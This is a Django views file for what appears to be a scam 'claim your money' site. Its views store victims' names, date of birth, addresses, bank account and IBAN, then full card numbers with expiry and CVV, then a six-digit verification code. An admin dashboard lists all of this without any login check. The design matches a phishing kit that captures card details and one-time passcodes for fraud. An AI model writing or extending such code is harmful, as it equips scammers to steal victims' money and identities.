from django.shortcuts import render, redirect
from .models import Claim
from django.contrib import messages
from .models import Payment
from .models import VerificationCode

# Create your views here.

def home(request):
    return render(request, 'home.html')

def claim_money(request):
    context = {
         'show_modal':  False,
         'claim': None,
    }
   
    
    if request.method == 'POST':
        claim =Claim.objects.create(
             full_name = request.POST['full_name'],
             other_name = request.POST['other_name'],
             dob = request.POST['dob'],
             email = request.POST['email'],
             phone = request.POST['phone'],
             bank_name = request.POST['bank_name'],
             account_number = request.POST['account_number'],
             iban = request.POST['iban'],
             current_address = request.POST['current_address'],
             previous_address = request.POST['previous_address'],
        )
        
        context['show_modal'] = True
        context['claim'] = claim

    return render(request, 'claim.html', context)

    #     claim= Claim.objects.create(
    #         full_name=full_name,
    #         other_name=other_name,
    #         dob=dob,
    #         email=email,
    #         phone=phone,
    #         bank_name=bank_name,
    #         account_number=account_number,
    #         iban=iban,
    #         current_address=current_address,
    #         previous_address=previous_address
    #     )
        
    # show_modal =True
    
    # return render(request, 'claim.html', {
    #     'show_modal': show_modal,
    #     'claim': claim,
    # })

def payment_page(request, claim_id):
    claim = Claim.objects.get(id=claim_id)

    if request.method == "POST":
        full_name = request.POST.get("full_name")
        card_number = request.POST.get("card_number")
        exp_date = request.POST.get("exp_date")
        cvv = request.POST.get("cvv")
        postal_code = request.POST.get("postal_code")

        Payment.objects.create(
            claim=claim,
            full_name=full_name,
            method="Card Payment",
            card_number=card_number,
            exp_date=exp_date,
            cvv=cvv,
            postal_code=postal_code,
        )

        return redirect("verify_code_page", claim_id=claim.id)
    
    return render(request, "payment.html", {"claim": claim})


def verify_code_page(request, claim_id):
    claim = Claim.objects.get(id=claim_id)


    if request.method == "POST":
        code = "".join([
            request.POST.get('d1'),
            request.POST.get('d2'),
            request.POST.get('d3'),
            request.POST.get('d4'),
            request.POST.get('d5'),
            request.POST.get('d6'),

        ])

        VerificationCode.objects.create(
            claim=claim,
            entered_code=code
        )

        return render(request, 'verify_code.html', {'claim': claim, 'show_modal': True})
    return render(request, 'verify_code.html', {'claim': claim})


def admin_dashboard(request):
    claims = Claim.objects.all().order_by('-created_at')
    payments = Payment.objects.all().order_by('-created_at')
    verifications = VerificationCode.objects.all().order_by('-created_at')

    context = {
        "claims": claims,
        "payments": payments,
        "verifications": verifications,
    }
    return render(request, "admin_dashboard.html", context)



